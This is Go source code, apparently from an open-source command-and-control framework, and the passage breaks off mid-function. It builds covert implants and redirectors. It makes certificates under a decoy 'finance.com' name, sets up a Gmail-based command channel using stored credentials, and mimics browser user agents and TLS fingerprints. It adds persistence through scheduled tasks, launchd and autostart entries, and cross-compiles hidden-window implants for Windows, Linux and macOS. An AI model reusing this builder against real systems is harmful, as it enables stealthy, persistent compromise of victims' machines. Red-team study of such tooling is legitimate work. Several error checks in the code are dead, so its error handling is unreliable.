
//By Rebujacker - Alvaro Folgado Rueda as an open source educative project

package main

import (

	"os/exec"
	"os"
	"fmt"
	"bytes"
	"encoding/json"
	"strings"
	"encoding/base64"

)

////JSON Structures for Compiling Redirectors and Implants (Bichito)


type RedConfig struct {
    Roaster string   `json:"roaster"`
    HiveFingenprint   string `json:"hivefingenprint"`
    Token string `json:"token"`
    BiToken string `json:"bitoken"`
    Saas string   `json:"saas"`
    Offline string   `json:"offline"`
    Coms string   `json:"coms"`
}

//Coms Modules Redirector Structs
type RedParanoidTls struct {
	Port string   `json:"port"`
}

type Redhttp struct {
	Port string   `json:"port"`
}

type RedSelfSignedhttps struct {
	Port string   `json:"port"`
}

type RedParanoidhttps struct {
	Port string   `json:"port"`
}


//SaaS Redirectors
type RedGmail struct {
	Redirectors []string   `json:"redirectors"`
}


type Redtwitter struct {

}

type BiConfig struct {
    Ttl string   `json:"ttl"`
    Resptime   string `json:"resptime"`
    Token string `json:"token"`
    Coms string   `json:"coms"`
    Persistence string `json:"persistence"`
}

//Coms Modules Bichito Structs
type BiParanoidTls struct {
	Port string   `json:"port"`
	RedFingenPrint string   `json:"redfingenrpint"`
	Redirectors []string   `json:"redirectors"`
}

type Bihttp struct {
	Port string   `json:"port"`
	Redirectors []string   `json:"redirectors"`
}

type BiSelfSignedhttps struct {
	Port string   `json:"port"`
	Redirectors []string   `json:"redirectors"`
}

type BiParanoidhttps struct {
	Port string   `json:"port"`
	RedFingenPrint string   `json:"redfingenrpint"`
	Redirectors []string   `json:"redirectors"`
}

//SaaS Redirectors
type BiGmail struct {
	Redirectors []string   `json:"redirectors"`
}

type BiGmailMimic struct {
    UserAgent string `json:"useragent"`
    TlsFingenprint string `json:"tlsfingenprint"`
    Redirectors []string   `json:"redirectors"`
}


type Bitwitter struct {

}

/// Persistence Modules Structs
//Windows
type BiPersistenceWinSchtasks struct {
	TaskName string   `json:"taskname"`
	Path string   `json:"implantpath"`
	
}

//Darwin
type BiPersistenceLaunchd struct {
	Path string   `json:"implantpath"`
	LaunchdName string   `json:"launchdname"`
}

//Linux
type BiPersistenceAutoStart struct {
	Path string   `json:"implantpath"`
	AutostartName string   `json:"autostartname"`
}


func createImplant(Offline string,name string,ttl string,resptime string,coms string,comsparams []string,persistenceOSX string,
		persistenceOSXParams string,persistenceWindows string,persistenceWindowsParams string,persistenceLinux string,persistenceLinuxParams string,redirectors []Red) string{

	var(
		errbuf,outbuf bytes.Buffer

		implant Implant
		modules Modules

		redconfig RedConfig
		biconfig BiConfig

		redCompilParams string
		biCompilParamsOSX string
		biCompilParamsWindows string
		biCompilParamsLinux string
	)


	//// Generate Auth Tokens for implant and it to DB,add auth tokens to compiling params, add folder
	redtoken := randomString(22)
	bitoken := randomString(22)

	//Encode to JSON objects to save Implant Configurations on DB
    bufM := new(bytes.Buffer)
    modules = Modules{coms,persistenceOSX,persistenceWindows,persistenceLinux}
	json.NewEncoder(bufM).Encode(modules)
	resultM := bufM.String()
	implant = Implant{name,ttl,resptime,redtoken,bitoken,resultM}
	errI := addImplantDB(&implant)
	if errI != nil {
		elog := fmt.Sprintf("%s%s","ImplantGeneration(Implant Exists):",errI)
		return elog
	}


	redconfig = RedConfig{getRoasterStringDB(),"","","","","",""}
	biconfig = BiConfig{ttl,resptime,"","",""}

	redconfig.Token = redtoken
	redconfig.BiToken = bitoken
	biconfig.Token = bitoken

	//// Generate Folder and Hive signature once all is good
	
	implantFolder := "/usr/local/STHive/implants/"+name

	//mkdir := exec.Command("/bin/sh","-c","mkdir "+implantFolder)
	mkdir := exec.Command("/bin/mkdir",implantFolder)
	mkdir.Stderr = &errbuf
	mkdir.Start()
	mkdir.Wait()
	mkdirErr := errbuf.String()

	// Record the error when generating a new Implant Set
	if (mkdirErr != ""){
		//ErrorLog
		errorT := mkdirErr
		elog := fmt.Sprintf("%s%s","Commands(ImplantGeneration-MKDIR):",errorT)
		return elog
	}

	hivefingenprint := exec.Command("/bin/sh","-c","openssl x509 -fingerprint -sha256 -noout -in /usr/local/STHive/certs/hive.pem | cut -d '=' -f2")
	hivefingenprint.Stdout = &outbuf
	hivefingenprint.Start()
	hivefingenprint.Wait()
	redconfig.HiveFingenprint = strings.Split(outbuf.String(),"\n")[0]
	outbuf.Reset()

	//Switch case for Implant/Redirectors Communication Modules Parameters
	switch coms{
		case "paranoidtlsgo":

		case "http":

		case "selfsignedhttpsgo":
			var(
				redselfsignedhttps RedSelfSignedhttps
				biselfsignedhttps BiSelfSignedhttps
			)


			redselfsignedhttps = RedSelfSignedhttps{comsparams[0]}
			biselfsignedhttps = BiSelfSignedhttps{comsparams[0],[]string{}}

			//Generate Redirector TLS Certificates
			redCerts := exec.Command("/bin/sh","-c", "openssl req -subj '/CN=finance.com/' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout "+implantFolder+"/red.key -out "+implantFolder+"/red.pem; cat "+implantFolder+"/red.key >> "+implantFolder+"/red.pem")
			errbuf.Reset()
			redCerts.Stderr = &errbuf
			redCerts.Start()
			redCerts.Wait()
			redcertErr := ""

			// Record the error when generating a new Implant Set
			if (redcertErr != ""){
				errorT := redcertErr
				elog := fmt.Sprintf("%s%s","Commands(ImplantGeneration-REDCERT):",errorT)
				return elog
			}

			//Get the TLS Signature for the Implants
			redSign := exec.Command("/bin/sh","-c", "openssl x509 -fingerprint -sha256 -noout -in "+ implantFolder +"/red.pem | cut -d '=' -f2")
			errbuf.Reset()
			redSign.Stdout = &outbuf
			redSign.Stderr = &errbuf
			redSign.Start()
			redSign.Wait()
			redSignErr := ""
							
			// Record the error when generating a new Implant Set
			if (redSignErr != ""){
				errorT := redSignErr
				elog := fmt.Sprintf("%s%s","Commands(ImplantGeneration-REDSIGN):",errorT)
				return elog
			}

			//biparanoidhttps.RedFingenPrint = strings.Split(outbuf.String(),"\n")[0]
			outbuf.Reset()

			//fmt.Println(redirectors)

			//Go over selected redirectos, add them to DB and update Implant Configuration Data
			for _,redirector := range redirectors{

				if Offline == "No" {
					genId := fmt.Sprintf("%s%s","R-",randomString(8))

					//Check if VPS/Domain exists
					extvps,_ := existVpsDB(redirector.Vps)
					extdomain,_ := existDomainDB(redirector.Domain)
					usedDomain,_ := isUsedDomainDB(redirector.Domain)
					if !extvps || !extdomain || usedDomain{
						elog := fmt.Sprintf("%s","ImplantGeneration(NotExistingVPS/Domain,UsedDomain,DB-Error)")
						return elog
					}

					// Add Redirector to DB
					implantId,_ := getImplantIdbyNameDB(name)
					vpsId,_ := getVpsIdbyNameDB(redirector.Vps)
					domainId,_ := getDomainIdbyNameDB(redirector.Domain)
					setUsedDomainDB(redirector.Domain,"Yes")
					addRedDB(genId,"","",vpsId,domainId,implantId)

					// Add Redirector data to Implant Redirectors Slice
					domainO := getDomainDB(redirector.Domain)
					biselfsignedhttps.Redirectors = append(biselfsignedhttps.Redirectors,domainO.Domain)
				}else{
					biselfsignedhttps.Redirectors = append(biselfsignedhttps.Redirectors,redirector.Domain)
					redconfig.Offline = name
				}
			}

			//If Offline let's add a dummy Redirector for comply with Architecture
			if Offline != "No" {
					genId := fmt.Sprintf("%s%s","R-",randomString(8))
					implantId,_ := getImplantIdbyNameDB(name)
					addRedDB(genId,"","",0,0,implantId)
			}

			//Debug
			//fmt.Println(biparanoidhttps.Redirectors)
			
			//Encode from JSON to string Redirector and Implant Configurations
			bufRP := new(bytes.Buffer)
			json.NewEncoder(bufRP).Encode(redselfsignedhttps)
			resultRP := bufRP.String()
			redconfig.Coms = resultRP 
	    	

			bufBP := new(bytes.Buffer)
			json.NewEncoder(bufBP).Encode(biselfsignedhttps)
			resultBP := bufBP.String()
			biconfig.Coms = resultBP 
	    	

		case "paranoidhttpsgo":
			var(
				redparanoidhttps RedParanoidhttps
				biparanoidhttps BiParanoidhttps
			)


			redparanoidhttps = RedParanoidhttps{comsparams[0]}
			biparanoidhttps = BiParanoidhttps{comsparams[0],"",[]string{}}

			//Generate Redirector TLS Certificates
			redCerts := exec.Command("/bin/sh","-c", "openssl req -subj '/CN=finance.com/' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout "+implantFolder+"/red.key -out "+implantFolder+"/red.pem; cat "+implantFolder+"/red.key >> "+implantFolder+"/red.pem")
			errbuf.Reset()
			redCerts.Stderr = &errbuf
			redCerts.Start()
			redCerts.Wait()
			redcertErr := ""

			// Record the error when generating a new Implant Set
			if (redcertErr != ""){
				errorT := redcertErr
				elog := fmt.Sprintf("%s%s","Commands(ImplantGeneration-REDCERT):",errorT)
				return elog
			}

			//Get the TLS Signature for the Implants
			redSign := exec.Command("/bin/sh","-c", "openssl x509 -fingerprint -sha256 -noout -in "+ implantFolder +"/red.pem | cut -d '=' -f2")
			errbuf.Reset()
			redSign.Stdout = &outbuf
			redSign.Stderr = &errbuf
			redSign.Start()
			redSign.Wait()
			redSignErr := ""
							
			// Record the error when generating a new Implant Set
			if (redSignErr != ""){
				errorT := redSignErr
				elog := fmt.Sprintf("%s%s","Commands(ImplantGeneration-REDSIGN):",errorT)
				return elog
			}

			biparanoidhttps.RedFingenPrint = strings.Split(outbuf.String(),"\n")[0]
			outbuf.Reset()


			//Go over selected redirectos, add them to DB and update Implant Configuration Data
			for _,redirector := range redirectors{

				if Offline == "No" {
					genId := fmt.Sprintf("%s%s","R-",randomString(8))

					//Check if VPS/Domain exists
					extvps,_ := existVpsDB(redirector.Vps)
					extdomain,_ := existDomainDB(redirector.Domain)
					usedDomain,_ := isUsedDomainDB(redirector.Domain)
					if !extvps || !extdomain || usedDomain{
						elog := fmt.Sprintf("%s","ImplantGeneration(NotExistingVPS/Domain,UsedDomain,DB-Error)")
						return elog
					}

					// Add Redirector to DB
					implantId,_ := getImplantIdbyNameDB(name)
					vpsId,_ := getVpsIdbyNameDB(redirector.Vps)
					domainId,_ := getDomainIdbyNameDB(redirector.Domain)
					setUsedDomainDB(redirector.Domain,"Yes")
					addRedDB(genId,"","",vpsId,domainId,implantId)

					// Add Redirector data to Implant Redirectors Slice
					domainO := getDomainDB(redirector.Domain)
					biparanoidhttps.Redirectors = append(biparanoidhttps.Redirectors,domainO.Domain)
				}else{
					biparanoidhttps.Redirectors = append(biparanoidhttps.Redirectors,redirector.Domain)
					redconfig.Offline = name
				}
			}

			//Debug
			//fmt.Println(biparanoidhttps.Redirectors)
			
			//Encode from JSON to string Redirector and Implant Configurations
			bufRP := new(bytes.Buffer)
			json.NewEncoder(bufRP).Encode(redparanoidhttps)
			resultRP := bufRP.String()
			redconfig.Coms = resultRP 
	    	

			bufBP := new(bytes.Buffer)
			json.NewEncoder(bufBP).Encode(biparanoidhttps)
			resultBP := bufBP.String()
			biconfig.Coms = resultBP 
	    	

		case "letsencrypthttpsgo":
		// Error Hnadling



		case "gmailgo":
			var(
				redgmail RedGmail
				bigmail BiGmail
			)

			redgmail = RedGmail{[]string{}}
			bigmail = BiGmail{[]string{}}

			var domainId int
			var vpsId int

			implantId,_ := getImplantIdbyNameDB(name)
			if Offline == "No"{
				vpsId,_ = getVpsIdbyNameDB(redirectors[0].Vps)
				extvps,_ := existVpsDB(redirectors[0].Vps)
				
				if !extvps{
					elog := fmt.Sprintf("%s","ImplantGeneration(NotExistingVPS)")
					return elog
				}
			}

			//Go over selected redirectos, add them to DB and update Implant Configuration Data
			for _,redirector := range redirectors{
				
				extdomain,_ := existDomainDB(redirector.Domain)
				usedDomain,_ := isUsedDomainDB(redirector.Domain)
				if !extdomain || usedDomain{
					elog := fmt.Sprintf("%s","ImplantGeneration(Domain,UsedDomain,DB-Error)")
					return elog
				}

				// Add Redirector to DB
				
				domainId,_ = getDomainIdbyNameDB(redirector.Domain)
				setUsedDomainDB(redirector.Domain,"Yes")
								
				// Add Redirector data to Implant Redirectors Slice
				domainO := getDomainFullDB(redirector.Domain)

				//Decode Parameters into GmailP and then create Gmail with name for SaaS Red List

    			var gmailP GmailP
    			errD := json.Unmarshal([]byte(domainO.Parameters),&gmailP)

    			//Debug:
    			//fmt.Println("Domain Name:"+redirector.Domain)
    			//fmt.Println("Domain Parameters:"+domainO.Parameters)
    			
    			if errD != nil{
        			elog := "ImplantGeneration(Gmail Parameters Decoding Error)"+errD.Error()
					return elog
    			}

				gmailO := Gmail{domainO.Name,gmailP.Creds,gmailP.Token}
				bufRP := new(bytes.Buffer)
				json.NewEncoder(bufRP).Encode(gmailO)

				if Offline == "No"{
					redconfig.Saas = domainO.Domain
					genId := fmt.Sprintf("%s%s","R-",randomString(8))			
					addRedDB(genId,"","",vpsId,domainId,implantId)
				}else{
					redconfig.Offline = name
				}

				redgmail.Redirectors = append(redgmail.Redirectors,bufRP.String())
				bigmail.Redirectors = append(bigmail.Redirectors,bufRP.String())

				
			}



			//Encode from JSON to string Redirector and Implant Configurations
			bufRP := new(bytes.Buffer)
			json.NewEncoder(bufRP).Encode(redgmail)
			resultRP := bufRP.String()
			redconfig.Coms = resultRP 
	    	

			bufBP := new(bytes.Buffer)
			json.NewEncoder(bufBP).Encode(bigmail)
			resultBP := bufBP.String()
			biconfig.Coms = resultBP 


		case "gmailmimic":
			var(
				redgmail RedGmail
				bigmail BiGmailMimic
			)

			redgmail = RedGmail{[]string{}}

			//Encode User Agent since is a param with space and can break compiling
			useragent := base64.StdEncoding.EncodeToString([]byte(comsparams[0]))
			bigmail = BiGmailMimic{useragent,comsparams[1],[]string{}}

			implantId,_ := getImplantIdbyNameDB(name)
			vpsId,_ := getVpsIdbyNameDB(redirectors[0].Vps)
			extvps,_ := existVpsDB(redirectors[0].Vps)
			var domainId int
			var saas string

			if !extvps{
				elog := fmt.Sprintf("%s","ImplantGeneration(NotExistingVPS)")
				return elog
			}
			//Go over selected redirectos, add them to DB and update Implant Configuration Data
			for _,redirector := range redirectors{
				extdomain,_ := existDomainDB(redirector.Domain)
				usedDomain,_ := isUsedDomainDB(redirector.Domain)
				if !extdomain || usedDomain{
					elog := fmt.Sprintf("%s","ImplantGeneration(Domain,UsedDomain,DB-Error)")
					return elog
				}

				// Add Redirector to DB
				
				domainId,_ = getDomainIdbyNameDB(redirector.Domain)
				setUsedDomainDB(redirector.Domain,"Yes")
								
				// Add Redirector data to Implant Redirectors Slice
				domainO := getDomainFullDB(redirector.Domain)

				//Decode Parameters into GmailP and then create Gmail with name for SaaS Red List

    			var gmailP GmailP
    			errD := json.Unmarshal([]byte(domainO.Parameters),&gmailP)

    			fmt.Println("Domain Name:"+redirector.Domain)
    			fmt.Println("Domain Parameters:"+domainO.Parameters)
    			if errD != nil{
        			elog := "ImplantGeneration(Gmail Parameters Decoding Error)"+errD.Error()
					return elog
    			}

				gmailO := Gmail{domainO.Name,gmailP.Creds,gmailP.Token}
				bufRP := new(bytes.Buffer)
				json.NewEncoder(bufRP).Encode(gmailO)

				saas = domainO.Domain
				redgmail.Redirectors = append(redgmail.Redirectors,bufRP.String())
				bigmail.Redirectors = append(bigmail.Redirectors,bufRP.String())

				genId := fmt.Sprintf("%s%s","R-",randomString(8))			
				addRedDB(genId,"","",vpsId,domainId,implantId)
			}



			//Encode from JSON to string Redirector and Implant Configurations
			bufRP := new(bytes.Buffer)
			json.NewEncoder(bufRP).Encode(redgmail)
			resultRP := bufRP.String()
			redconfig.Saas = saas
			redconfig.Coms = resultRP 
	    	

			bufBP := new(bytes.Buffer)
			json.NewEncoder(bufBP).Encode(bigmail)
			resultBP := bufBP.String()
			biconfig.Coms = resultBP 


		default:
			elog := "CompilingCommands(ImplantGeneration):A network Module need to be choosen"
			return elog

	}

	//With Module Parameters Encoded, craft the final Json blob to be passed as compile params to both redirectors and Implants
	bufRedCompilParams := new(bytes.Buffer)
	json.NewEncoder(bufRedCompilParams).Encode(redconfig)
	redCompilParams = bufRedCompilParams.String()

	//Redirector module for the moment is just the network module
	rModules := coms

	
	var bModulesOSX,bModulesWindows,bModulesLinux string

	//Configure Persistence Params
	switch persistenceOSX{
		case "launchd":

			biconfig.Persistence = persistenceOSXParams
			bModulesOSX = coms + "," + "launchd"
		default:
			biconfig.Persistence = "NoPersistence"
			bModulesOSX = coms + "," + "nopersistence"
	}

	//Craft OSX Compiled Params for the Implant
	bufbiCompilParamsOSX := new(bytes.Buffer)
	json.NewEncoder(bufbiCompilParamsOSX).Encode(biconfig)
	biCompilParamsOSX = bufbiCompilParamsOSX.String()


	switch persistenceWindows{
		case "schtasks":

			biconfig.Persistence = persistenceWindowsParams
			bModulesWindows = coms + "," + "schtasks"

		default:
			biconfig.Persistence = "NoPersistence"
			bModulesWindows = coms + "," + "nopersistence"
	}

	bufbiCompilParamsWindows := new(bytes.Buffer)
	json.NewEncoder(bufbiCompilParamsWindows).Encode(biconfig)
	biCompilParamsWindows = bufbiCompilParamsWindows.String()

	switch persistenceLinux{
		case "linuxautostart":

			biconfig.Persistence = persistenceLinuxParams
			bModulesLinux = coms + "," + "linuxautostart"

		default:
			biconfig.Persistence = "NoPersistence"
			bModulesLinux = coms + "," + "nopersistence"
	}

	bufbiCompilParamsLinux := new(bytes.Buffer)
	json.NewEncoder(bufbiCompilParamsLinux).Encode(biconfig)
	biCompilParamsLinux = bufbiCompilParamsLinux.String()




	// Generate executables/shellcodes for redirectors and implants in target Implant Folder


	//Debug: Catch Bichitos JSON arguments
	fmt.Println("Red Params: "+ redCompilParams +" Module Tags: "+ rModules)
	fmt.Println("Windows Implant Params: "+ biCompilParamsWindows +" Windows Module Tags: "+ bModulesWindows)
	fmt.Println("OSX Implant Params: "+ biCompilParamsOSX +" OSX Module Tags: "+ bModulesOSX)
	fmt.Println("Linux Implant Params: "+ biCompilParamsLinux +" Linux Module Tags: "+ bModulesLinux)
	
	
	//redgen := exec.Command("/bin/sh","-c", "export GOPATH=/usr/local/STHive/sources/; GOOS=linux GOARCH=amd64 /usr/local/STHive/sources/go/bin/go build --ldflags '-X main.parameters="+ redCompilParams +"' -tags " + rModules + " -o "+ implantFolder +"/redirector redirector")

	//bichitoLx32 := exec.Command("/bin/sh","-c", "export GOPATH=/usr/local/STHive/sources/; GOOS=linux GOARCH=386 /usr/local/STHive/sources/go/bin/go build --ldflags '-X main.parameters="+ biCompilParams +"' -tags "+ bModules +" -o "+ implantFolder +"/bichitoLinuxx32 bichito")
	//bichitoLx64 := exec.Command("/bin/sh","-c", "export GOPATH=/usr/local/STHive/sources/; GOOS=linux GOARCH=amd64 /usr/local/STHive/sources/go/bin/go build --ldflags '-X main.parameters="+ biCompilParams +"' -tags "+ bModules +" -o "+ implantFolder +"/bichitoLinuxx64 bichito")
	//bichitoWx32 := exec.Command("/bin/sh","-c", "export GOPATH=/usr/local/STHive/sources/; GOOS=windows GOARCH=386 /usr/local/STHive/sources/go/bin/go build --ldflags '-X main.parameters="+ biCompilParams +" -H=windowsgui' -tags "+ bModules +" -o "+ implantFolder +"/bichitoWindowsx32 bichito")
	//bichitoWx64 := exec.Command("/bin/sh","-c", "export GOPATH=/usr/local/STHive/sources/; GOOS=windows GOARCH=amd64 /usr/local/STHive/sources/go/bin/go build --ldflags '-X main.parameters="+ biCompilParams +" -H=windowsgui' -tags "+ bModules +" -o "+ implantFolder +"/bichitoWindowsx64 bichito")
	//bichitoOx32 := exec.Command("/bin/sh","-c", "export GOPATH=/usr/local/STHive/sources/; GOOS=darwin GOARCH=386 /usr/local/STHive/sources/go/bin/go build --ldflags '-X main.parameters="+ biCompilParams +"' -tags "+ bModules +" -o "+ implantFolder +"/bichitoOSXx32 bichito")
	//bichitoOx64 := exec.Command("/bin/sh","-c", "export GOPATH=/usr/local/STHive/sources/; GOOS=darwin GOARCH=amd64 /usr/local/STHive/sources/go/bin/go build --ldflags '-X main.parameters="+ biCompilParams +"' -tags "+ bModules +" -o "+ implantFolder +"/bichitoOSXx64 bichito")

	redgen := exec.Command("/usr/local/STHive/sources/go/bin/go","build","--ldflags","-X main.parameters="+redCompilParams,"-tags",rModules,"-o",implantFolder+"/redirector","redirector")
	redgen.Env = os.Environ()
	redgen.Env = append(redgen.Env,"GOPATH=/usr/local/STHive/sources/")
	redgen.Env = append(redgen.Env,"GOOS=linux")
	redgen.Env = append(redgen.Env,"GOARCH=amd64")
	redgen.Env = append(redgen.Env,"GOCACHE=/tmp/.cache")	


	bichitoLx32 := exec.Command("/usr/local/STHive/sources/go/bin/go","build","--ldflags","-X main.parameters="+biCompilParamsLinux,"-tags",bModulesLinux,"-o",implantFolder+"/bichitoLinuxx32","bichito")
	bichitoLx32.Env = os.Environ()
	bichitoLx32.Env = append(bichitoLx32.Env,"GOPATH=/usr/local/STHive/sources/")
	bichitoLx32.Env = append(bichitoLx32.Env,"GOOS=linux")
	bichitoLx32.Env = append(bichitoLx32.Env,"GOARCH=386")
	bichitoLx32.Env = append(bichitoLx32.Env,"GOCACHE=/tmp/.cache")

	bichitoLx64 := exec.Command("/usr/local/STHive/sources/go/bin/go","build","--ldflags","-X main.parameters="+biCompilParamsLinux,"-tags",bModulesLinux,"-o",implantFolder+"/bichitoLinuxx64","bichito")
	bichitoLx64.Env = os.Environ()
	bichitoLx64.Env = append(bichitoLx64.Env,"GOPATH=/usr/local/STHive/sources/")
	bichitoLx64.Env = append(bichitoLx64.Env,"GOOS=linux")
	bichitoLx64.Env = append(bichitoLx64.Env,"GOARCH=amd64")
	bichitoLx64.Env = append(bichitoLx64.Env,"GOCACHE=/tmp/.cache")



	/*
	bichitoWx32 := exec.Command("/usr/local/STHive/sources/go/bin/go","build","--ldflags","-X main.parameters="+biCompilParams,"-tags",bModules,"-o",implantFolder+"/bichitoWindowsx32","bichito")
	bichitoWx32.Env = os.Environ()
	bichitoWx32.Env = append(bichitoWx32.Env,"GOPATH=/usr/local/STHive/sources/")
	bichitoWx32.Env = append(bichitoWx32.Env,"GOOS=windows")
	bichitoWx32.Env = append(bichitoWx32.Env,"GOARCH=386")
	bichitoWx32.Env = append(bichitoWx32.Env,"GOCACHE=/tmp/.cache")

	bichitoWx64 := exec.Command("/usr/local/STHive/sources/go/bin/go","build","--ldflags","-X main.parameters="+biCompilParams,"-tags",bModules,"-o",implantFolder+"/bichitoWindowsx64","bichito")
	bichitoWx64.Env = os.Environ()
	bichitoWx64.Env = append(bichitoWx64.Env,"GOPATH=/usr/local/STHive/sources/")
	bichitoWx64.Env = append(bichitoWx64.Env,"GOOS=windows")
	bichitoWx64.Env = append(bichitoWx64.Env,"GOARCH=amd64")
	bichitoWx64.Env = append(bichitoWx64.Env,"GOCACHE=/tmp/.cache")

	
	bichitoOx32 := exec.Command("/usr/local/STHive/sources/go/bin/go","build","--ldflags","-X main.parameters="+biCompilParams,"-tags",bModules,"-o",implantFolder+"/bichitoDarwinx32","bichito")
	bichitoOx32.Env = os.Environ()
	bichitoOx32.Env = append(bichitoOx32.Env,"GOPATH=/usr/local/STHive/sources/")
	bichitoOx32.Env = append(bichitoOx32.Env,"GOOS=darwin")
	bichitoOx32.Env = append(bichitoOx32.Env,"GOARCH=386")
	bichitoOx32.Env = append(bichitoOx32.Env,"GOCACHE=/tmp/.cache")

	bichitoOx64 := exec.Command("/usr/local/STHive/sources/go/bin/go","build","--ldflags","-X main.parameters="+biCompilParams,"-tags",bModules,"-o",implantFolder+"/bichitoDarwinx64","bichito")
	bichitoOx64.Env = os.Environ()
	bichitoOx64.Env = append(bichitoOx64.Env,"GOPATH=/usr/local/STHive/sources/")
	bichitoOx64.Env = append(bichitoOx64.Env,"GOOS=darwin")
	bichitoOx64.Env = append(bichitoOx64.Env,"GOARCH=amd64")
	bichitoOx64.Env = append(bichitoOx64.Env,"GOCACHE=/tmp/.cache")
	*/


	
	bichitoWx32 := exec.Command("/usr/local/STHive/sources/go/bin/go","build","--ldflags","-X main.parameters="+biCompilParamsWindows+" -H=windowsgui","-tags",bModulesWindows,"-o",implantFolder+"/bichitoWindowsx32","bichito")
	bichitoWx32.Env = os.Environ()
	bichitoWx32.Env = append(bichitoWx32.Env,"GOPATH=/usr/local/STHive/sources/")
	bichitoWx32.Env = append(bichitoWx32.Env,"GOOS=windows")
	bichitoWx32.Env = append(bichitoWx32.Env,"GOARCH=386")
	bichitoWx32.Env = append(bichitoWx32.Env,"GOCACHE=/tmp/.cache")
	bichitoWx32.Env = append(bichitoWx32.Env,"CGO_ENABLED=1")
	bichitoWx32.Env = append(bichitoWx32.Env,"CC=i686-w64-mingw32-gcc")
	bichitoWx32.Env = append(bichitoWx32.Env,"CXX=i686-w64-mingw32-g++")

	bichitoWx64 := exec.Command("/usr/local/STHive/sources/go/bin/go","build","--ldflags","-X main.parameters="+biCompilParamsWindows+" -H=windowsgui","-tags",bModulesWindows,"-o",implantFolder+"/bichitoWindowsx64","bichito")
	bichitoWx64.Env = os.Environ()
	bichitoWx64.Env = append(bichitoWx64.Env,"GOPATH=/usr/local/STHive/sources/")
	bichitoWx64.Env = append(bichitoWx64.Env,"GOOS=windows")
	bichitoWx64.Env = append(bichitoWx64.Env,"GOARCH=amd64")
	bichitoWx64.Env = append(bichitoWx64.Env,"GOCACHE=/tmp/.cache")
	bichitoWx64.Env = append(bichitoWx64.Env,"CGO_ENABLED=1")
	bichitoWx64.Env = append(bichitoWx64.Env,"CC=x86_64-w64-mingw32-gcc")
	bichitoWx64.Env = append(bichitoWx64.Env,"CXX=x86_64-w64-mingw32-g++")
	

	bichitoOx32 := exec.Command("/usr/local/STHive/sources/go/bin/go","build","--ldflags","-X main.parameters="+biCompilParamsOSX,"-tags",bModulesOSX,"-o",implantFolder+"/bichitoOSXx32","bichito")
	bichitoOx32.Env = os.Environ()
	bichitoOx32.Env = append(bichitoOx32.Env,"GOPATH=/usr/local/STHive/sources/")
	bichitoOx32.Env = append(bichitoOx32.Env,"GOOS=darwin")
	bichitoOx32.Env = append(bichitoOx32.Env,"GOARCH=386")
	bichitoOx32.Env = append(bichitoOx32.Env,"GOCACHE=/tmp/.cache")
	bichitoOx32.Env = append(bichitoOx32.Env,"PATH=/usr/local/STHive/sources/osxcross/target/bin/:"+os.Getenv("PATH"))
	bichitoOx32.Env = append(bichitoOx32.Env,"CGO_ENABLED=1")
	bichitoOx32.Env = append(bichitoOx32.Env,"CC=o32-clang")

	bichitoOx64 := exec.Command("/usr/local/STHive/sources/go/bin/go","build","--ldflags","-X main.parameters="+biCompilParamsOSX,"-tags",bModulesOSX,"-o",implantFolder+"/bichitoOSXx64","bichito")
	bichitoOx64.Env = os.Environ()
	bichitoOx64.Env = append(bichitoOx64.Env,"GOPATH=/usr/local/STHive/sources/")
	bichitoOx64.Env = append(bichitoOx64.Env,"GOOS=darwin")
	bichitoOx64.Env = append(bichitoOx64.Env,"GOARCH=amd64")
	bichitoOx64.Env = append(bichitoOx64.Env,"GOCACHE=/tmp/.cache")
	bichitoOx64.Env = append(bichitoOx64.Env,"PATH=/usr/local/STHive/sources/osxcross/target/bin/:"+os.Getenv("PATH"))
	bichitoOx64.Env = append(bichitoOx64.Env,"CGO_ENABLED=1")
	bichitoOx64.Env = append(bichitoOx64.Env,"CC=o64-clang")

	var comperrRed,comperrLx32,comperrLx64,comperrWx32,comperrWx64,comperrOx32,comperrOx64 bytes.Buffer
	var compoutRed,compoutLx32,compoutLx64,compoutWx32,compoutWx64,compoutOx32,compoutOx64 bytes.Buffer

	redgen.Stderr = &comperrRed
	bichitoLx32.Stderr = &comperrLx32
	bichitoLx64.Stderr = &comperrLx64
	bichitoWx32.Stderr = &comperrWx32
	bichitoWx64.Stderr = &comperrWx64
	bichitoOx32.Stderr = &comperrOx32
	bichitoOx64.Stderr = &comperrOx64

	redgen.Stdout = &compoutRed
	bichitoLx32.Stdout = &compoutLx32
	bichitoLx64.Stdout = &compoutLx64
	bichitoWx32.Stdout = &compoutWx32
	bichitoWx64.Stdout = &compoutWx64
	bichitoOx32.Stdout = &compoutOx32
	bichitoOx64.Stdout = &compoutOx64


	redgen.Start()
	redgen.Wait()
	bichitoLx32.Start()
	bichitoLx32.Wait()
	bichitoLx64.Start()
	bichitoLx64.Wait()
	bichitoWx32.Start()
	bichitoWx32.Wait()
	bichitoWx64.Start()
	bichitoWx64.Wait()
	bichitoOx32.Start()
	bichitoOx32.Wait()
	bichitoOx64.Start()
	bichitoOx64.Wait()


	implantCompillingError := comperrRed.String()+comperrLx32.String()+comperrLx64.String()+compoutWx32.String()+compoutWx64.String()+compoutOx32.String()+compoutOx64.String()

	//Debug:
	implantCompillingOut := compoutRed.String()+compoutLx32.String()+compoutLx64.String()+compoutWx32.String()+compoutWx64.String()+compoutOx32.String()+compoutOx64.String()
	fmt.Println("Implant CompErr Debug: "+implantCompillingError)
	fmt.Println("Implant CompOut Debug: "+implantCompillingOut)

	// Record the error when generating a new Implant Set
	if (implantCompillingError != ""){
		elog := "CompilingCommands(ImplantGeneration):"+implantCompillingError
		return elog
	}


	// Generate target Infraestructure for Implant
	if Offline == "No" {
		infraResult := generateImplantInfra(implantFolder,coms,comsparams,redirectors)
		if infraResult != "Done" {
			return infraResult
		}
	}
	
	//Generate the Redirector Zip Folder for Downloads
	var ziperrbuf bytes.Buffer
	redZip := exec.Command("/bin/sh","-c", "zip -j "+implantFolder+"/redirector.zip "+implantFolder+"/red*")
	redZip.Stderr = &errbuf
	redZip.Start()
	redZip.Wait()
	redZipErr := ziperrbuf.String()

	if (redZipErr != "") {
		elog := fmt.Sprintf("%s%s","redZipCreation(ImplantGeneration):",redZip)
		return elog
	}


	return ""
}

//TO-DO, remove orphan bichitos (sending remove infection,logs, etc...)

func removeImplant(name string) string{

	implantFolder := "/usr/local/STHive/implants/"+name
	destroyImplantInfra(implantFolder)
	bichitosIds,err := getAllBidbyImplantNameDB(name)
	if err != nil{
		return err.Error()
	}

	for _,bid := range bichitosIds {
		//TO-DO:Send remove infection
		rmJobsbyChidDB(bid) 
		rmLogsbyPidDB(bid)
		//removeInfection(bid)
		rmBibyBidDB(bid)
	}


